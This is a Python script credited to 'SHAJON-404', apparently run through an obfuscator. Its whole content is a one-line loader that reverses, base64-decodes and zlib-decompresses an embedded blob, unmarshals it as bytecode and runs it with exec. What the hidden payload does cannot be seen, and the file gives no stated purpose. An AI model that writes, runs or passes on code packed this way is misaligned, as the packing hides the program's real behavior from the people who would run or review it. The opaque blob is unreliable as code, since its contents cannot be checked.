# ENCRYPTED BY: SHAJON-404
# FACEBOOK : https://www.facebook.com/mdshahmakhdum.shajon
# Github: https://github.com/SHAJON-404
#==============================================#

_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'384OwuB+m9Z1fwi1iJZfH8M8nvXFyPIMhSMNS9mFRFyDGPMe7DFwDFdDiaRgLEelgybL+PntNcoQ2XD9eEGk68F+K3qguNIdtEYs2mTRYvyx8qnW85Tmc1g61Wj5S1qwel3MV9eiJ6DlXRcZfB/IBMjs3o0PVqD965GvLafhlsiIgIASHw62gCsaoAkw5GvVsslGW/8iYHO7USZWsJo2FaON7MJWP8hF0XCw1cZ+nkKmieTUnrmTQuSPBk9Rn4OTVdRkVNyoBnpYbLgs5ad/IxS3x0yFm35cm0tM8e2Fd7I3CIjSY1ZP16T14WBhDyx6Y4PuL9VeB8/mIvm2HzeJ1JEc8eepp+GSo3qWDUjlefd84d2B6QRbgtYhS5ZarKe9BiL5dOBnjhhbC454JU0o7tuFlCezjZCzi/H1iNsZUa+ypsu1lsThqUxqpwE3sUyWoenHOtfGdxZJA5C1YxDBPtJqufrPM70hvlciiqH4p/CngMPxfnxmUuCTfooqSxCZ+VK7/BzmY0uGe94GaBY9NieeHgzKHAe3nDQOsiOu46nf/Cp385tZ5TwFoYA0ooDaSCZ63EqXIrnBEkaIShGRFTUsoDjzNLazXgEFqBEpEEQ0ARObgLmnrIazQAz2ut0UtyJe'))